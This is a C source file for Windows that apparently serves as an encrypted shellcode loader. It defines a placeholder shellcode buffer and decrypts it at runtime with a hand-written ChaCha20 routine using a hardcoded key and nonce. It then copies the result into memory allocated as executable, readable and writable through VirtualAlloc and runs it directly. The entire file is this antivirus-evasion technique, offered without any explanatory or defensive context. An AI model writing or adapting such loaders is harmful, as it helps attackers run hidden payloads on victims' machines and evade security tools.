#include <windows.h>

unsigned char buf[] = { /* <shellcode> */ };

const unsigned int KEY[8] = {
    0x03020100, 0x07060504, 0x0b0a0908, 0x0f0e0d0c,
    0x13121110, 0x17161514, 0x1b1a1918, 0x1f1e1d1c
};
const unsigned int NONCE[3] = { 0x00000000, 0x4a000000, 0x00000000 };
const unsigned int COUNTER = 1;

unsigned int rotl32(unsigned int v, unsigned int c) {
    return (v << c) | (v >> (32 - c));
}

void quarter_round(unsigned int x[16], unsigned int a, unsigned int b, unsigned int c, unsigned int d) {
    x[a] += x[b]; x[d] ^= x[a]; x[d] = rotl32(x[d], 16);
    x[c] += x[d]; x[b] ^= x[c]; x[b] = rotl32(x[b], 12);
    x[a] += x[b]; x[d] ^= x[a]; x[d] = rotl32(x[d], 8);
    x[c] += x[d]; x[b] ^= x[c]; x[b] = rotl32(x[b], 7);
}

void chacha20_block(unsigned int out[16], unsigned int counter) {
    unsigned int state[16] = {
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
        KEY[0], KEY[1], KEY[2], KEY[3],
        KEY[4], KEY[5], KEY[6], KEY[7],
        counter, NONCE[0], NONCE[1], NONCE[2]
    };
    unsigned int x[16];
    for (int i = 0; i < 16; i++) x[i] = state[i];
    for (int i = 0; i < 10; i++) {
        quarter_round(x, 0, 4, 8, 12);
        quarter_round(x, 1, 5, 9, 13);
        quarter_round(x, 2, 6, 10, 14);
        quarter_round(x, 3, 7, 11, 15);
        quarter_round(x, 0, 5, 10, 15);
        quarter_round(x, 1, 6, 11, 12);
        quarter_round(x, 2, 7, 8, 13);
        quarter_round(x, 3, 4, 9, 14);
    }
    for (int i = 0; i < 16; i++) out[i] = x[i] + state[i];
}

void chacha20_decrypt(unsigned char* data, unsigned int len) {
    unsigned int stream[16];
    unsigned int counter = COUNTER;
    for (unsigned int i = 0; i < len; i += 64) {
        chacha20_block(stream, counter++);
        unsigned char* ks = (unsigned char*)stream;
        unsigned int n = len - i;
        if (n > 64) n = 64;
        for (unsigned int j = 0; j < n; j++) {
            data[i + j] ^= ks[j];
        }
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    chacha20_decrypt(buf, sizeof(buf));
    void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    unsigned char* dst = (unsigned char*)exec;
    for (unsigned int i = 0; i < sizeof(buf); i++) dst[i] = buf[i];
    ((void(*)())exec)();
    return 0;
}
